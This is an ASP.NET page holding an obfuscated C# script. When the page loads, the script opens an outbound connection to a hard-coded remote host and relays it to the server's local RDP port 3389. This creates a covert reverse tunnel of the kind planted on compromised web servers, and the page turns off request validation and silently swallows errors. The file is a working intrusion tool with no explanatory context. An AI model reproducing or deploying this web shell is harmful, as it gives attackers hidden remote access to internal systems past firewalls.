<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1f.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">

public string localip = "127.0.0.1";
public string localport="3389";
public string remoteip= "192.168.11.89";
public string remoteport = "600";

public NetworkStream NS=null;
public NetworkStream NS1=null;
TcpClient tcp=new TcpClient();
TcpClient zvxm=new TcpClient();
ArrayList IVc=new ArrayList();
protected void Page_load(object sender,EventArgs e)
{


try{

ruQO();
}catch(Exception exp)
{
   Response.Write("except "+exp.Message);
}


}

public class PortForward
{
public string Localaddress;
public int LocalPort;
public string RemoteAddress;
public int RemotePort;
string type;
Socket ltcpClient;
Socket rtcpClient;
Socket server;
byte[] DPrPL=new byte[2048];
byte[] wvZv=new byte[2048];
public struct session
{
public Socket rdel;
public Socket ldel;
public int llen;
public int rlen;
}
public static IPEndPoint mtJ(string host,int port)
{
IPEndPoint iep=null;
IPHostEntry aGN=Dns.Resolve(host);
IPAddress rmt=aGN.AddressList[0];
iep=new IPEndPoint(rmt,port);
return iep;
}
public void Start(string Rip,int Rport,string lip,int lport)
{
try
{
LocalPort=lport;
RemoteAddress=Rip;
RemotePort=Rport;
Localaddress=lip;
rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
 ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
 rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);
 }
catch (Exception ex) { }
}
protected void iiGFO(IAsyncResult ar)
{
try
{
session RKXy=new session();
RKXy.ldel=ltcpClient;
RKXy.rdel=rtcpClient;
ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);
 }
catch (Exception ex) { }
}
protected void VTp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
ltcpClient.EndConnect(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);
 RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);
 }
catch (Exception ex) { }
}
private void LFYM(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.rdel.EndReceive(ar);
if (Ret>0)
ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);
 else lyTOK();
}
catch (Exception ex) { }
}
private void JTcp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.ldel.EndSend(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);
 }
catch (Exception ex) { }
}
private void xPS(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.ldel.EndReceive(ar);
if (Ret>0)
RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);
else lyTOK();
}
catch (Exception ex) { }
}
private void IZU(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.rdel.EndSend(ar);
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);
 }
catch (Exception ex) { }
}
public void lyTOK()
{
try
{
if (ltcpClient!=null)
{
ltcpClient.Close();
}
if (rtcpClient!=null)
rtcpClient.Close();
}
catch (Exception ex) { }
}
}
protected void vuou()
{
PortForward gYP=new PortForward();
gYP.lyTOK();
}
protected void ruQO()
{
PortForward gYP=new PortForward();
gYP.Start(remoteip,int.Parse(remoteport),localip,int.Parse(localport));
}
</script>